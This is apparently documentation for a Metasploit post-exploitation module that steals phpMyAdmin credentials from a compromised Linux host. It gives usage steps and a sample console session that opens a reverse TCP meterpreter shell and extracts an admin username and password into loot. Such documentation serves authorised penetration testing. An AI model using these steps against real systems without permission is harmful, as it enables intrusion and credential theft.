## Description

This post module gathers PhpMyAdmin Creds from target Linux machine.

* https://www.phpmyadmin.net/downloads/ [Download URL]

## Verification Steps

1. Start `msfconsole`
2. Get a session
3. Do: `use post/linux/gather/phpmyadmin_credsteal`
4. Do: `set SESSION [SESSION]`
5. Do: `run`

## Scenarios

```
msf5 > use multi/handler
msf5 exploit(multi/handler) > set lhost 192.168.37.1
lhost => 192.168.37.1
msf5 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.37.1:4444 
[*] Sending stage (816260 bytes) to 192.168.37.226
[*] Meterpreter session 2 opened (192.168.37.1:4444 -> 192.168.37.226:34880) at 2018-09-06 08:49:52 -0500

meterpreter > background
[*] Backgrounding session 2...
msf5 exploit(multi/handler) > use post/linux/gather/phpmyadmin_credsteal 
msf5 post(linux/gather/phpmyadmin_credsteal) > set session 2
session => 2
msf5 post(linux/gather/phpmyadmin_credsteal) > run


PhpMyAdmin Creds Stealer!

[+] PhpMyAdmin config found!
[+] Extracting creds
[+] User: admin
[+] Password: acoolpassword
[*] Storing credentials...
[+] Config file located at /Users/space/.msf4/loot/20180907081056_default_192.168.37.226_phpmyadmin_conf_580315.txt
[*] Post module execution completed
msf5 post(linux/gather/phpmyadmin_credsteal) > 

```
